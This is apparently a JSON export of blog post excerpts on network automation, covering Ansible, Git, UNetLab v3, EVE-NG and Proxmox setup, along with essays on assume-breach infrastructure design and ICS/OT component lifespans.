particularly secure host that must handle all management operations performed by operators on production environments. This host is usually subject to audits and continuous verification.\nAnsible can be configured to be used through a bastion host, but the configuration depends closely on the protocol used. For our purposes, we will limit ourselves to SSH.\nIn our environment, our computer, Linux or MacOS, acts as the Ansible Controller, while the server EVE-NG acts as the bastion host: the devices are only reachable from the EVE-NG server.\nIt is important to note that in this way, the local Python environment will be used, not that of the bastion host. Any library or module errors, therefore, refer to the local system. The bastion host is simply used as a bridge, and for this reason, it does not require any particular configuration, except for authentication via public key.\nSSH via Bastion Host Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/11/20/running-ansible-playbooks-through-a-bastion-host/","title":"Running Ansible playbooks through a Bastion host"},{"categories":["learning-paths","automation"],"contents":"While Ansible is an ideal choice in terms of accessibility, it\u0026rsquo;s certainly not the best choice for those seeking performance.\nLet\u0026rsquo;s look at some specific configurations that allow us to improve performance in a simple way.\nParallelism (fork) The first configuration concerns the number of forks, which are the parallel processes that interact with devices. In general, it should be a number proportional to the number of processors, however, it\u0026rsquo;s important to consider that much of the playbook time is actually spent waiting for the device to execute a specific command. The optimal value for forks could therefore be double the number of available processors, but it can be further increased. Obviously, the value of forks improves performance only if the playbook is executed in parallel on multiple nodes. Otherwise, it has no influence.\n[defaults] forks = 8 Dependency (strategy) The second value concerns the execution strategy (strategy). There are two types of strategies: linear and free.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/11/13/boosting-ansible-performance/","title":"Boosting Ansible performance"},{"categories":["learning-paths","automation"],"contents":"The method we are using with Ansible is called \u0026ldquo;screen-scraper\u0026rdquo;, meaning the interaction with the device is not done through APIs but via CLI, emulating human activity. While this approach might be straightforward when typing commands, reading the outputs can be particularly challenging.\nConsider the following output:\nThe above output is readable by humans but requires some work to be usable in a program. For instance, if we wanted to read the IP address of the Ethernet0/0 interface, we would need to search for the line where the interface name appears and then move a certain number of characters until we encounter the IP address. However, this is the format used by the Cisco IOS device in this example. If we change vendors or, in some cases, versions, the format of the table might change.\nParsers in Ansible handle this task: they read a text and convert it into a data structure. Parsers, essential unless working with APIs, are available for various types of text .\nRegarding the topic we are addressing, we will look at four of them:\nTextFSM NTC Templates PyATS / Genie TTP For our tests, we will use the \u0026ldquo;Simple Network Lab\u0026rdquo; environment, with R1 already running and reachable.\nTextFSM TextFSM , explored in a module of the basic course, is a module that reads a text and transforms it into a list of dictionaries. For example, the following text:\nCan be transformed into:\nWriting a template for TextFSM, at first glance, may not be simple, but once understood, it is not so complex. In this course, we limit ourselves to using existing templates, and in particular, we will refer to the NTC Templates repository. Let\u0026rsquo;s retrieve the template for the show ip interface brief command on Cisco IOS devices.\nNow, we need to write a short playbook to connect to the device, issue the show ip interface brief command, and save it in a variable. The task is as follows:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/11/06/ansible-parsers-and-filters/","title":"Ansible parsers and filters"},{"categories":["learning-paths","automation"],"contents":"As our first image, we choose to use VyOS, which is publicly available on GitHub . We will work from a single host, and later we can distribute our image. Let\u0026rsquo;s download the image to the host:\nwget -O- https://github.com/vyos/vyos-nightly-build/releases/download/1.5-rolling-202409220007/vyos-1.5-rolling-202409220007-generic-amd64.iso \u0026amp;gt; /var/tmp/pveupload-0000 The image name must strictly follow the regex /var/tmp/pveupload-[0-9a-f]+.\nUpload the image to the unetlab datastore with the correct name:\npvesh create /nodes/proxmox1/storage/unetlab/upload -content iso -filename vyos-vyos-1.5-202409220007.iso -tmpfilename /var/tmp/pveupload-0000 Delete the image from the temporary directory:\nrm -f /var/tmp/pveupload* Preparing the Template Next, let\u0026rsquo;s create a temporary VM to install and configure VyOS:\npvesh create /nodes/proxmox1/qemu -cores 1 -cpu host -cdrom unetlab:iso/vyos-vyos-1.5-202409220007.iso,media=cdrom -memory 2048 -name template-vyos-vyos-1.5-202409220007 -net0 virtio,bridge=vmbr0 -ostype other -scsihw virtio-scsi-single -sockets 1 -tags \u0026#34;unl;template\u0026#34; -virtio0 unetlab:2,format=qcow2,backup=1,iothread=on -vmid 1000 -serial0 socket -vga none In this case, we have disabled the graphical card and added a serial interface to be used as a terminal.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/10/30/preparing-vyos-image-for-unetlab-v3/","title":"Preparing VyOS image for UNetLab v3"},{"categories":["learning-paths","automation"],"contents":"UNetLab\u0026rsquo;s architecture involves several components that need to interact with each other and report task progress to the user. We can identify the following components:\nThe web interface allows users to interact with UNetLab, manage users, and labs. Proxmox hosts manage the nodes and networks of the labs according to instructions received from users and notify the status of the nodes. The orchestrator, which is the engine that manages tasks and input received from the user through the web interface and from the hosts via a specific agent. The orchestrator At first glance, we can imagine a Redis server collecting input from users (via the web interface) and from hosts. The orchestrator receives messages from Redis and forwards them, transforming them, to the web interface or to agents running on the hosts.\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/10/23/unetlab-v3-architecture/","title":"UNetLab v3 architecture"},{"categories":["learning-paths","automation"],"contents":"Handlers allow you to associate actions with tasks that make changes to devices. The key feature of handlers is that they are executed once, right before the end of the playbook.\nA good example is saving a configuration. Throughout a playbook, configurations may be modified multiple times, but saving can happen only once at the end of the playbook.\nHere\u0026rsquo;s a task that configures NTP servers:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/10/16/using-ansible-handlers-for-optimized-task-execution/","title":"Using Ansible handlers for optimized task execution"},{"categories":["ciso"],"contents":"There is much discussion around Zero Trust Architecture (ZTA), but it seems the concept of Assume Breach Design has yet to be formalized. Or, at least, a Google search does not yield results. The term Assume Breach Paradigm is used, and I want to apply it to infrastructure design. So, I am appropriating (in a manner of speaking) the term and explaining why changing the mindset could be beneficial.\nAs always, the idea stems from field experience, when I realize that infrastructure design, from a cybersecurity perspective, follows a traditional approach. In the 1990s and 2000s, it was common to implement a DMZ network, a server network, and sometimes a client network. Policies were designed based on application needs and were never formalized. This approach, still frequently used today, relies on the classic 3-tier architecture of web applications: clients, servers, and databases, which had to be implemented separately. From a security standpoint, this led to logically separating these components through a firewall.\nWhat I see today is precisely the consequence of this: systems are separated based on an application logic, not a security logic. The result is that companies have security zones that separate application components (Internet, DMZ, client, server, OT, Guest), and policies derive from application needs, not security requirements.\nA case in point: server networks typically contain the backend and databases for the entire company. If one is compromised, the whole network is at risk.\nA second equally telling example: I imagine anyone who has implemented firewall policies based on an application request. The vast majority of firewall policies originate from application needs, and their impact is rarely evaluated because rejecting the request is not an option.\nPolicy Design The first attempt at a mindset shift was almost ten years ago. I was in a position to influence the network and security architecture of the company I was working for, and following the advice of an ISO27001 auditor, I formalized the interactions between different security zones.\nThe idea was to publish a manifesto so that everyone in the company would know the rules governing the firewalls.\nHere are some examples:\nThe server network cannot receive connections from the Internet; The DMZ network can access the server network only through HTTP/HTTPS protocols; Server and DMZ networks could only access the Internet on a specific list of addresses/protocols. All rules were designed to reduce the risk of compromise or lateral movement. But there were some fundamental errors.\nThe first error (mine) was that the evaluation was conducted by me, and at the time, my experience was primarily in defensive security. A few years later, when I began working on offensive security as well, I realized that while the approach was correct, the assumptions were incomplete.\nThe second error (company-wide) was failing to give this work the importance it deserved. It was seen as an obstacle created by a paranoid technician rather than a document meant to design secure applications within the company.\nSpecifically, the 3-tier paradigm was converted to Client (Internet) - Reverse Proxy (DMZ) - Server. It goes without saying that a reverse proxy, without any functionality other than forwarding connections from the Internet to the internal network, has the sole consequence of exposing the internal network directly to the Internet. This should be obvious, but even today, I find several configurations like this.\nThe last consequence was that when I left that company, the manifesto was shelved and forgotten.\nA Technical Matter Anyway, the experience helped me over the years to provide an approach to technical teams that needed to organize firewall policies. Shifting the focus from policy to the needs of the systems before deciding where to place them helps prevent problems rather than chasing them.\nThe formalization of policies never worked because it was seen by companies as a technical issue, not related to the business.\nParticularly, the words a CEO said to me a few years ago were illuminating: cybersecurity is a technical problem, and thus it is entrusted to the CIO.\nThe Purpose of the DMZ Another factor that drove me to rethink the approach to defending companies is my frequent task of analyzing firewall policies to bring order and logic. Almost always, I find NAT rules that allow direct access from the Internet to internal systems. Often these are necessities related to specific applications, IoT systems, cameras, or building automation in general.\nIn all these cases, there is a DMZ, which prompts me to ask what the purpose of having a DMZ is if internal systems are still directly exposed.\nWhat I discovered is that the DMZ is often created without a clear understanding of the concept behind it.\nOriginally, the DMZ network was intended to be the most at-risk segment of the infrastructure: the policies governing traffic to and from the DMZ were meant to be particularly stringent. Some might call this the Zero Trust approach today.\nGoing back many years, systems in the DMZ network did not have Internet access. This was because if a system was compromised, it could not communicate outward.\nOver the years, this paradigm has crumbled (like many others) because many application frameworks require external resources (XML schemas, telemetry, licenses).\nThe concept of \u0026ldquo;containment\u0026rdquo; in the DMZ has gradually eroded, and today a DMZ network risks becoming just another network. Quite frequently, I find:\nDatabases residing in the DMZ; DMZ networks that can access the Internet indiscriminately; Internal systems that can access the DMZ indiscriminately; Unrestricted Internet access from the DMZ and internal networks; Weak systems exposed on the Internet, residing in the DMZ or even internal networks; Reverse proxies that map internal systems to the Internet without providing any security mechanism. I could go on, but I believe the point is clear.\nDefense in Depth The idea behind the Defense in Depth paradigm is to protect a system from cyberattacks using a multi-layered approach. In other words, we should not rely on a single protection (the firewall), but foresee multiple layers that can act together if one or more protections fail.\nTo be clear, a defense layer could consist of:\nFirewall VPN Anti-malware MFA Monitoring Vulnerability scanner IDS/IPS Physical security Defense in Depth is promoted by the NSA , which advises associating each layer with one or more of the five cybersecurity functions as defined in the cybersecurity framework formalized by NIST .\nI find the Defense In Depth approach absolutely correct, but, in my opinion, it risks being too technical and thus disconnected from the business. In a way, it was the mistake I made: not being able to speak to the business side, I could not secure the space I needed.\nZero Trust Architecture ZTA, unfortunately, is becoming a mantra. ZTA is defined by NIST in the document SP 800-207 , which should be studied before discussing ZTA. I will try to summarize some points useful for my reflections, quoting directly from the original document.\nThat is, authorized and approved subjects (combination of user, application (or service), and device) can access the data to the exclusion of all other subjects (i.e., attackers). To take this one step further, the word \u0026ldquo;resource\u0026rdquo; can be substituted for \u0026ldquo;data\u0026rdquo; so that ZT and ZTA are about resource access (e.g., printers, compute resources, Internet of Things IoT actuators) and not just data access.\nZTA pertains to data access, where the data can reside on any system, including printers, IoT systems, and, of course, servers, databases, and so on. The subject is, therefore, digital data in any form.\nAccess to resources is determined by dynamic policy—including the observable state of client identity, application/service, and the requesting asset—and may include other behavioral and environmental attributes.\nData access is determined by dynamic policies built on who is requesting the data, who holds the data. Policies may consider other environmental or behavioral attributes.\nRequesting asset state can include device characteristics such as software versions installed, network location, time/date of request, previously observed behavior, and installed credentials. Behavioral attributes include, but not limited to, automated subject analytics, device analytics, and measured deviations from observed usage patterns.\nToday we build policies based on the identity of the source and destination. The destination identity typically consists of an IP address and port. The source identity is slightly more complex, considering not only the IP address but also the associated user. In more complex infrastructures, the source is also validated according to specific requirements concerning patch status and the presence of anti-malware.\nWe rarely use attributes related to location and time. Even less frequently, we use behavioral attributes (e.g., if the client behaves differently from expected).\nThe ZTA approach would require allowing access to data only when strictly necessary. To achieve this, we would need to:\nIdentify the source in terms of device, user, application requesting the data, the client\u0026rsquo;s location, the time of the request, the source\u0026rsquo;s behavior, and compliance status; Identify the means by which the request arrives (Internet, VPN, private network, encryption\u0026hellip;); Identify the requested data and the operation being requested. Although technologies capable of implementing almost all (but not all) features required by\nZTA exist, it is still not a paradigm widely implemented today.\nThe reason, in my opinion, is always the same: ZTA is seen as a technical approach, detached from the business.\nAssume Breach Design Let\u0026rsquo;s move on to the assume breach paradigm applied to design. The core idea is quite simple: my architectural choices are guided by the assessment of the risk of a potential breach. We could call it risk-based design, but in my opinion, the term would be less effective.\nThere are two important premises:\nIt is necessary to be able to thoroughly assess the possible attack paths against the infrastructure. It is necessary to be able to evaluate the impact of potential breaches on the business. The first point requires specific offensive skills that are different from those of someone who designs and defends an infrastructure. Those who do not make use of these skills will make substantial mistakes in designing defenses.\nThe second point requires the ability to conduct a Business Impact Analysis (BIA) for each attack scenario.\nOnly after these assessments can we determine which defenses to implement. In this sense, Defense in Depth and ZTA are consequences of Assume Breach Design, not its premises.\nLet\u0026rsquo;s return to the example of particularly large server networks that contain backends and databases for all company applications. The consequence of this design is that if one is compromised, the attacker can move relatively easily to all critical business systems. If we correctly assess this scenario, we realize that it is unacceptable. At this point, we can implement a microsegmentation technology and try to reduce the traffic flows between these hosts. But we can also consider monitoring technologies that allow us to identify traffic anomalies. Both approaches have pros and cons, and there is no one-size-fits-all solution. The assessment of business risk helps us determine the available budget, and consequently, we can select the solution that best fits our context.\nI can, therefore, break down ZTA into parts and decide where it is important. The decision is based on a risk analysis of attack scenarios: in other words, Assume Breach Design.\nPost Breach All the infrastructures I know have grown gradually and without structure. In other words, there is never any documentation that describes how the infrastructure, in terms of servers and applications, was created. On the one hand, the task would be impossible with traditional tools, while on the other, the assume breach paradigm forces us to think about how we would respond to an attack.\nIn almost all cases (and I am being optimistic), if we notice an ongoing attack within our infrastructure, we are not able to say for sure how far the attack has spread. In other words, we do not know how to eradicate the attack from the infrastructure unless we completely rebuild it.\nThe Infrastructure as Code paradigm can help us build our infrastructure (or part of it) starting from text files. The use of microservices and containers allows us to do the same in the application domain. If we start to embrace this mindset, we realize that we can rebuild the entire infrastructure at any moment, and the build process can serve as documentation.\nThe advantages are immediate: documentation, standardization, compliance\u0026hellip; However, the complexity of the tools remains a barrier to adoption for many organizations. The rigidity of the infrastructure is actually an apparent problem that reveals the underlying operational chaos.\nConclusions The Assume Breach Design approach aims to bring business back to the center of decision-making. The infrastructure exists to serve one purpose: the company\u0026rsquo;s business. The protections that technical teams decide on today are implemented to safeguard the company\u0026rsquo;s business.\nPutting business back at the center means shifting cybersecurity from being a technical matter to a business necessity.\nFor too many years, I have seen IT departments considered as a black hole that absorbs budget. The effects of this mindset are clear to everyone. Maybe it\u0026rsquo;s time for a change.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2024/10/12/assume-breach-design/","title":"Assume breach design"},{"categories":["learning-paths","automation"],"contents":"When developing playbooks, it\u0026rsquo;s often necessary to modify Ansible\u0026rsquo;s default behavior in case of errors.\nHere are three common scenarios:\nWhen a task should only run in a specific mode When a task should never report changes When a task should fail under certain conditions Additionally, we\u0026rsquo;ll explore three scenarios that are useful to know but rarely encountered in practice.\nRunning Tasks in a specific mode You can enforce a task to run only in a specific mode. For instance, the following task runs only in check mode (-C):\nHowever, this doesn\u0026rsquo;t change the task\u0026rsquo;s behavior, only when it is executed. In check mode, commands that can alter the system are not executed. Each module handles check mode differently.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/10/09/handling-errors-in-ansible-playbooks/","title":"Handling errors in Ansible playbooks"},{"categories":["learning-paths","automation"],"contents":"EVE-NG is installed from packages downloaded from the official repository via APT. All the following commands should be executed by the root user via SSH.\nFirst, we add the official repository and the GPG key to verify the packages:\nwget -O - http://www.eve-ng.net/jammy/eczema@ecze.com.gpg.key | gpg --dearmor -o /etc/apt/trusted.gpg.d/eve-ng.gpg cat \u0026amp;lt;\u0026amp;lt; EOF \u0026amp;gt; /etc/apt/sources.list.d/eve-ng.list deb [arch=amd64] http://www.eve-ng.net/jammy jammy main # deb-src [arch=amd64] http://www.eve-ng.net/jammy jammy main EOF Next, we can reload the repositories, upgrade the system, and install EVE-NG CE along with other packages we will use later:\napt-get update apt-get -y upgrade apt-get -y install build-essential dnsmasq eve-ng iptables-persistent libbz2-dev libffi-dev libgdbm-dev libncurses5-dev libnss3-dev libreadline-dev libsqlite3-dev libssl-dev python3-pip zlib1g-dev Continue reading the post on Patreon .\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2024/10/05/installing-eve-ng-6/","title":"Installing EVE-NG 6"},{"categories":["learning-paths","automation"],"contents":"One of the biggest challenges when using Ansible, especially at the beginning, is troubleshooting. You often run into errors that are unclear, poorly described, or misleading.\nLet\u0026rsquo;s look at some strategies to help resolve otherwise incomprehensible errors.\ndos2unix: In rare cases, issues arise from how different operating systems handle text files. When working in Linux environments, ensure that your files are in the correct format.\nyamllint and yamlfmt: Ansible playbooks are written in YAML. Before troubleshooting further, make sure your files are correctly formatted as valid YAML.\nansible-lint: Ansible playbooks follow a specific structure, which can be validated with the built-in linter included in the Ansible package.\nVerbosity: You can make the execution of playbooks more verbose by adding one or more -v flags. Usually, -vvv is enough to reveal hidden errors.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/10/02/strategies-for-troubleshooting-ansible-errors/","title":"Strategies for troubleshooting Ansible errors"},{"categories":["learning-paths","automation"],"contents":"UNetLab requires a cluster with one or more correctly configured PVE hosts. This page contains all the commands needed to configure a PVE host.\nInstall the custom kernel for UNetLab To enable L1 links, UNetLab needs a kernel with a specific patch. The kernel and patch are released in the unetlab-kernel repository . You can either download the correct release or compile your own using the provided script.\nTo download the custom kernel, run the following commands:\ncd /usr/src export TAG=6.8.8-3 wget https://github.com/dainok/unetlab-kernel/releases/download/${TAG}/proxmox-headers-${TAG}-pve-unl_${TAG}_amd64.deb wget https://github.com/dainok/unetlab-kernel/releases/download/${TAG}/proxmox-kernel-${TAG}-pve-unl_${TAG}_amd64.deb Now, install the custom kernel:\napt-get update apt-get install -y build-essential dpkg -i proxmox--${TAG}-pve-unldeb Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/09/30/preparing-a-proxmox-cluster-for-unetlab-v3/","title":"Preparing a Proxmox cluster for UNetLab v3"},{"categories":["learning-paths","automation"],"contents":"Let\u0026rsquo;s finally see how to contribute to an open-source project. We\u0026rsquo;ll use the NTC-Templates project as a practical example, for which I have already developed 46 patches .\nLet\u0026rsquo;s assume we\u0026rsquo;ve already made the necessary changes, and now we want to propose them for official inclusion in the NTC Templates repository.\nConfigure git Configure some git mandatory options:\ngit config --global user.email \u0026#34;andrea.dainese@pm.me\u0026#34; git config --global user.name \u0026#34;Andrea Dainese\u0026#34; Fork, clone, update and merge the latest changes Fork the NTC Templates GitHub repository via the web and clone the repository locally:\ngit clone https://github.com/dainok/ntc-templates Add the original upstream:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/git.webp","permalink":"https://www.adainese.it/blog/2024/09/25/contributing-to-ntc-templates-with-git-and-github/","title":"Contributing to NTC Templates with Git and GitHub"},{"categories":["learning-paths","automation"],"contents":"In the last two posts, we covered most of the essential Git features. Now, let\u0026rsquo;s dive into some additional functionalities that might come in handy.\n.gitignore The .gitignore file is used to specify which files or directories should never be included in your Git repository. This file is tailored to each repository and typically excludes:\nCache files Compiled files Temporary files Password files You can either start with GitHub\u0026rsquo;s suggested templates or create your own using the correct format .\nStashing your work Sometimes you need to put aside your current work to focus on something more urgent. If you\u0026rsquo;ve made changes but aren\u0026rsquo;t ready to commit, switching branches won\u0026rsquo;t work because Git doesn\u0026rsquo;t know how to handle uncommitted changes.\nThis is where stash comes in. It saves all your changes, including those staged for commit, and allows you to retrieve them later:\nNow you can safely switch branches. To retrieve the stashed changes later:\nYou can also list all stashed changes with:\nDeleting Remote Branches While local branches can be deleted with the branch command, deleting a remote branch involves a push:\nRebase Rebase lets you integrate changes in a way similar to merge, but it reapplies a series of commits starting from a different base, effectively rewriting the history of the repository. Be cautious, this can cause inconsistencies, especially in public repos where multiple people collaborate.\nFor example, in a repo with main and branches fix3 and fix4 waiting to be merged:\nIf we merge the fix3 branch, we notice that the commit IDs have been preserved:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/git.webp","permalink":"https://www.adainese.it/blog/2024/09/19/advanced-git-commands/","title":"Advanced Git commands"},{"categories":["learning-paths","automation"],"contents":"If you\u0026rsquo;ve got some experience with programming languages, you might find Ansible\u0026rsquo;s constructs a bit clunky. But no worries, let\u0026rsquo;s break them down with some practical examples to make things clearer.\nConditionals (if, then, else) In Ansible, the if-then-else construct is simplified to a single word: when.\nUnlike traditional languages, there\u0026rsquo;s no direct else or elif. You\u0026rsquo;ll handle them all with separate when statements and the right expressions.\nIf you\u0026rsquo;ve got a bunch of conditions that all need to be true at the same time (logical AND), you can list them out:\nEach variable in Ansible can be one of the following types:\nList Dictionary Boolean (True/true/yes/on or False/false/no/off) Integer Float String (if it\u0026rsquo;s wrapped in quotes or doesn\u0026rsquo;t fit the above types) Ansible heavily relies on Jinja , which adds a bit more complexity to the mix. Any variable created using Jinja is treated as a string, and you\u0026rsquo;ll often need to convert it before use. But sometimes Ansible takes care of this for you, like when it automatically converts a string containing JSON into a list or dictionary when used in a loop.\nHere\u0026rsquo;s a quick breakdown to help you navigate this:\nVariables can be either defined or undefined. A defined variable might be empty (None) or have some data. The variable\u0026rsquo;s type depends on the data it holds (Ansible uses weak typing). Ansible often creates strings using Jinja, which may require conversion. Ansible will automatically convert strings into lists or dictionaries when needed. Before performing mathematical operations, it\u0026rsquo;s a good habit to explicitly convert variables using Jinja filters like | int or | float. Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/09/16/ansible-statements/","title":"Ansible statements"},{"categories":["learning-paths","automation"],"contents":"We\u0026rsquo;ve run a series of field tests to check if the idea we\u0026rsquo;re working on is feasible and functional. The results are positive, the APIs support most of the key features (but not all).\nOur next step is to define and model the data structure of the lab environment.\nOne of UNetLab\u0026rsquo;s main issues was that users had to manually build a lab, node by node, setting up interfaces, addresses, and routing before getting a functional environment. We\u0026rsquo;re addressing this by introducing two states:\nHLL (High Level Lab): A rough outline of the lab in terms of nodes, links, and features. LLL (Low Level Lab): A detailed lab generated from the HLL. Below, we\u0026rsquo;ll describe the data structure. Full examples are available in the UNetLab repository .\nNodes and Features Here\u0026rsquo;s an example with 4 VyOS nodes configured with Loopback and OSPF on all interfaces:\nFeatures reference specific Ansible playbooks that configure each node. Variables can be passed with \u0026ldquo;:\u0026rdquo;. The nodes will be named R1, R2, R3, and R4.\nTopology The 4 nodes can be connected in a full-mesh:\nContinue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/09/13/lab-modeling-for-unetlab-v3/","title":"Lab modeling for UNetLab v3"},{"categories":["learning-paths","automation"],"contents":"In the previous post, we covered the basics of using Git locally. Now, let\u0026rsquo;s dive into real-world scenarios and learn how to collaborate using Git with remote repositories.\nWhen working with remote repositories, we gain access to some new functionalities:\nclone: allows us to create a local copy of a remote repository. pull: lets us update our local branch with changes from the remote. push: enables us to update the remote branch with our local changes. Typically, pull and push actions are not allowed directly on the main branch. This forces us to always create a new branch for our changes, which we\u0026rsquo;ll then merge into the main branch.\nMoreover, we often don\u0026rsquo;t have permission to create branches on repositories we don\u0026rsquo;t own. This requires us to create a fork, which is a copy of the entire repository we want to work on. We can then create a branch on this new repository, make our changes, and request (via a Pull Request or PR) that the original repository merges our changes.\nBut let\u0026rsquo;s take it step by step.\nOrigin First, let\u0026rsquo;s clone a repository of our choice:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/git.webp","permalink":"https://www.adainese.it/blog/2024/09/10/collaborating-with-git-by-working-with-remote-repositories-and-forks/","title":"Collaborating with Git by working with remote repositories and forks"},{"categories":["learning-paths","automation"],"contents":"Git is a distributed version control software created by Linus Torvalds to manage the Linux kernel source code . Personally, I use Git, along with GitHub , to manage:\nThe source code for the software I develop ; The source code and compiled files for my website ; The source code for the books I\u0026rsquo;ve written ; My notes, written with Obsidian . Git allows me to track every change and, overall, the evolution of a repository. It\u0026rsquo;s well-suited to handle any file that can be represented as text. This is why, for the past few years, I\u0026rsquo;ve been using Markdown to write text and have embraced the Documentation as Code approach.\nGit is a vital tool that should be mastered by anyone working in IT, but it\u0026rsquo;s essential for developers.\nBefore getting started, here are some important considerations:\nStorage: Git saves every version of every file. For text files, we know that changes can be represented by just the lines that have been modified, but for binary files, a revision often means saving a full copy of the file. So, keep in mind that a repository may grow in size, and it might require maintenance to reduce the space used, which will improve its performance. Clean Structure: Especially when working in a team, it\u0026rsquo;s important to adopt a common workflow. The repository should only contain the files necessary to recreate the environment and avoid cache, compiled, or temporary files. Security: Since Git saves permanent copies of all files added to the repository, be cautious about including files with sensitive information like passwords. While you can remove references to such files locally, this process isn\u0026rsquo;t fully effective on third-party platforms like GitHub. In this series of posts, we\u0026rsquo;ll explore the fundamentals of Git. For those interested in learning more, I recommend the following resources:\nPro Git Book by Scott Chacon and Ben Straub GIT for Beginners by Anthony Baire Working Locally Let\u0026rsquo;s start working with Git by creating a local repository. Any empty or non-empty directory can be initialized as a Git repository:\nThe commands above create a .git directory, which contains all the information for the repository. As long as this directory remains intact, the contents of the repository are safe.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/git.webp","permalink":"https://www.adainese.it/blog/2024/09/06/git-fundamentals-for-developers-and-it-professionals/","title":"Git fundamentals for developers and IT professionals"},{"categories":["ciso"],"contents":"It\u0026rsquo;s time to revisit the ICS/OT world, as it has unique characteristics that influence its processes and tools.\nFirst, I would categorize this broad field into the following groups:\nSystems localized within a confined area (e.g., a building or campus) Systems geographically distributed but accessible through protected/dedicated networks (often SCADA systems fall under this category) Systems geographically distributed and connected to the Internet without additional controls (often IoT systems fall under this category). I\u0026rsquo;ve chosen this classification because, as we\u0026rsquo;ll see in the following posts, it dictates our ability to mitigate risks by implementing additional security measures. Clearly, there are other categorizations we should consider (e.g., based on risk), but this is the one I\u0026rsquo;d like to use as a starting point.\nBased on my experience, I want to highlight that most ICS/OT/IoT systems have a longer lifespan than the support period of individual components. This is crucial when planning a realistic strategy. Even though certain regulations require that components be upgradable, we will inevitably face situations where we need to protect components that are no longer sold, supported, or maintained.\nLifespan vs. Support Duration As previously mentioned, in my experience, ICS/OT/IoT systems often remain operational for longer than the manufacturers of individual components anticipated. In other words, the components (particularly software, but not exclusively) are no longer supported, yet the integrated system is still in use.\nThose familiar with the industrial, medical, maritime, or oil \u0026amp; gas sectors (and I\u0026rsquo;d add banking as well) encounter this daily: systems are based on components (e.g., Windows) and remain active well beyond the end of their support period. This is unavoidable for three reasons:\nThe aforementioned systems are generally untouchable: no changes or updates are permitted because their effects are unknown. In some cases, I\u0026rsquo;ve had vendors strongly advise against updating IEC62443-certified products, despite the regulation allowing for it. Many of the above systems have a very high acquisition cost (in terms of millions or tens of millions). Decommissioning or even simple refitting incurs unjustifiable costs for a system that is still functional (in the sense that it performs its intended work). I\u0026rsquo;ve often encountered operational systems supplied by defunct companies, leaving no support available. Here again, the cost of acquiring a new system is unjustifiable. The three points above mainly stem from the approach of the companies and individuals designing such systems. These systems are built to perform their tasks safely, even under stress. But\u0026hellip; when we began discussing Industry 4.0 and started connecting systems designed to work to an IP network, we introduced a new risk: Cyber risk.\nIn conversations with suppliers and customers of ICS/OT/IoT systems, I realize that Cyber risk is not even considered. To be honest, as a professional, I find some topological choices rather peculiar.\nIn this regard, manufacturers and integrators still need to fully grasp the implications of bringing fragile technologies (from a Cyber perspective) onto IP and connecting them to the Internet.\nGiven the topic, I\u0026rsquo;d add that the regulatory world is moving in a certain direction (see NIS, machinery regulation, IMO\u0026hellip;). Will we finally see concrete results? Personally, I\u0026rsquo;m not so optimistic.\nComponent Lifespan We\u0026rsquo;ve discussed regulations and reality. Now, let\u0026rsquo;s look at some examples demonstrating that component lifespan will inevitably be shorter than system lifespan. As mentioned earlier, systems continue to be used until they fail and repairs become economically unfeasible compared to purchasing a new system.\nLet\u0026rsquo;s examine a few examples.\nBluetooth In the ICS world, I\u0026rsquo;ve noticed a preference for using Bluetooth in recent years to simplify system reconfiguration activities. Specifically, Bluetooth is used to remote some control commands (non-emergency). In this case, we should consider the risks introduced by a wireless protocol, but for now, let\u0026rsquo;s focus on the various protocol releases. A new Bluetooth protocol standard is released approximately every 2-3 years. This means that in an industrial system with a lifespan of 15 years, we could find very old and potentially vulnerable protocol releases.\nWiFi A similar discussion applies to the WiFi standard, which has been used in ICS for years to manage mobile parts. Regarding security, in just under 20 years, we\u0026rsquo;ve seen four standards (WEP, WPA, WPA2, WPA3) successively introduced to address security issues.\nToday, it\u0026rsquo;s quite common to find ICS systems based on WEP, where the WiFi network is an extension of the wired field network.\nHMI Even today, almost all HMI systems I encounter are based on Microsoft Windows. Starting from Windows XP, we\u0026rsquo;ve seen 6 different versions over 23 years, approximately one every 4 years. As before, it\u0026rsquo;s equally easy to find ICS/OT systems still running on Windows XP.\nAnd as recent history has shown, there are systems with even older versions, released more than 30 years ago, and just because they\u0026rsquo;re old doesn\u0026rsquo;t necessarily mean they need to be replaced.\nOn the other hand, with Ubuntu, which I see fairly widespread, an LTS has a lifespan of about 5 years. Considering that no development is aligned with the latest release, we can assume that a system around 3 years old is already out of support. This doesn\u0026rsquo;t just impact ICS systems but typically OT and IoT systems as well.\nVulnerability Management Managing vulnerabilities doesn\u0026rsquo;t necessarily mean updating. It means managing risk, which can be done by implementing additional security measures to reduce it.\nWhen conducting vulnerability assessments, I generally advise against doing so on ICS/OT parts. Here\u0026rsquo;s why:\nICS/OT systems are extremely fragile, and it\u0026rsquo;s highly likely (I\u0026rsquo;d say certain) that a VA activity would negatively impact the systems. ICS/OT systems are generally untouchable. This means that even if vulnerabilities are found, they can\u0026rsquo;t be mitigated through updates or EDR. As mentioned, ICS/OT systems have a long lifespan, so it\u0026rsquo;s likely (again, I\u0026rsquo;d say certain) that we\u0026rsquo;ll find vulnerabilities due to obsolete systems. The point I want to make is that in ICS/OT environments, it\u0026rsquo;s almost certain that there will be severe, unpatchable 